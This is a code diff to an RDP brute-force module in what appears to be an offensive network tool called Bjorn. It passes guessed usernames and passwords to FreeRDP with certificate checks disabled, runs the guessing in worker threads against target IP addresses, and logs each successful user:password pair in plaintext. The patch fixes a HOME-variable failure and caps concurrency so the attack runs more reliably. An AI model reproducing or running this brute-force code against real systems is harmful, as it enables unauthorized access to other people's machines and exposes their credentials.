@@ -118,10 +118,16 @@ class RDPConnector:
 
         # Fall back to system xfreerdp if bundled not found
         if not os.path.exists(sfreerdp_path):
+            logger.warning(f"sfreerdp not found at {sfreerdp_path}, falling back to xfreerdp")
             sfreerdp_path = "xfreerdp"
             bin_dir = None
+        else:
+            logger.debug(f"Using sfreerdp at {sfreerdp_path}")
 
-        env_prefix = f"OPENSSL_MODULES={bin_dir} " if bin_dir else ""
+        # HOME is required by FreeRDP for ~/.freerdp/ certificate cache.
+        # Bjorn's daemon process may not have HOME set, causing silent rc=255 failure.
+        # Point HOME to payload dir so .freerdp/ stays inside the payload.
+        env_prefix = f"HOME={script_dir} OPENSSL_MODULES={bin_dir} " if bin_dir else f"HOME={script_dir} "
         return sfreerdp_path, env_prefix
 
     def check_no_auth(self, adresse_ip):
@@ -181,11 +187,16 @@ class RDPConnector:
         command = f"{env_prefix}{sfreerdp_path} /v:{adresse_ip} /u:{user} /p:{password} /cert:ignore +auth-only"
         try:
             stdout, stderr, returncode = subprocess_with_timeout(command, timeout=15)
-            return self._check_rdp_auth_success(stdout, stderr, returncode)
+            result = self._check_rdp_auth_success(stdout, stderr, returncode)
+            if result:
+                logger.info(f"RDP auth SUCCESS for {user}:{password} rc={returncode}")
+            return result
         except TimeoutError:
             logger.lifecycle_timeout("RDPBruteforce", "sfreerdp auth", 15, adresse_ip)
             return False
         except subprocess.SubprocessError as e:
+            if user in ('admin', 'root'):
+                logger.warning(f"RDP SubprocessError for {user}:{password}: {e}")
             return False
 
     def worker(self, success_flag):
@@ -264,7 +275,9 @@ class RDPConnector:
 
         logger.info(f"Bruteforcing RDP on {adresse_ip}... (0/{total_tasks})")
 
-        for _ in range(self.shared_data.worker_threads):  # Configurable via shared_config.json
+        # RDP NLA can't handle many concurrent connections - limit to 2 threads
+        rdp_threads = min(2, self.shared_data.worker_threads)
+        for _ in range(rdp_threads):
             t = threading.Thread(target=self.worker, args=(success_flag,))
             t.start()
             threads.append(t)
